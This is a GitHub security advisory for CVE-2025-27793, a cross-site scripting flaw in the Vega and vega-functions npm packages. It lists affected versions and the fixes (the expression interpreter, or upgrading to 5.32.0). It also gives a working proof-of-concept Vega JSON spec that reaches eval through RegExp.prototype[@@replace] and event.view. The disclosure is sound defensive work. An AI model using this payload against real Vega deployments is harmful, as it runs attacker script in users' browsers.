# [M] Vega vulnerable to Cross-site Scripting via RegExp.prototype[@@replace]

## Summary
Severity: Medium
Advisory: GHSA-963h-3v39-3pqf
CVE: CVE-2025-27793
CWE: CWE-79, CWE-87
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N (CVSS_V4)
Published: 2025-03-27
Source: https://github.com/advisories/GHSA-963h-3v39-3pqf
Type: github-advisory

## Affected
- npm: `vega` — affected >=0 <5.32.0
- npm: `vega-functions` — affected >=0 <5.17.0

## Details
## Impact

Users running Vega/Vega-lite JSON definitions could run unexpected JavaScript code when drawing graphs, unless the library is used with the `vega-interpreter`.

## Workarounds

- Use `vega` with [expression interpreter](https://vega.github.io/vega/usage/interpreter/)
- Upgrade to a [newer Vega version](https://github.com/vega/vega/releases/tag/v5.32.0) (`5.32.0`)

### POC Summary

Calling `replace` with a `RegExp`-like pattern calls `RegExp.prototype[@@replace]`, which can then call an attacker-controlled `exec` function.

### POC Details

Consider the function call `replace('foo', {__proto__: /h/.constructor.prototype, global: false})`. Since `pattern` has `RegExp.prototype[@@replace]`, `pattern.exec('foo')` winds up being called.

The resulting malicious call looks like this:
```
replace(<string argument>, {__proto__: /h/.constructor.prototype, exec: <function>, global: false})
```

Since functions cannot be returned from this, an attacker that wishes to escalate to XSS must abuse `event.view` to gain access to `eval`.

### Reproduction steps

```
{"$schema":"https://vega.github.io/schema/vega/v5.json","signals":[{"name":"a","on":[{"events":"body:mousemove{99999}","update":"replace('alert(1)',{__proto__:/h/.constructor.prototype,exec:event.view.eval,global:false})"}]}]}
```

## References
- https://github.com/vega/vega/security/advisories/GHSA-963h-3v39-3pqf
- https://nvd.nist.gov/vuln/detail/CVE-2025-27793
- https://github.com/vega/vega/commit/694560c0aa576df8b6c5f0f7d202ac82233e6966
- https://github.com/vega/vega
- https://github.com/vega/vega/releases/tag/v5.32.0
- https://vega.github.io/vega/usage/interpreter
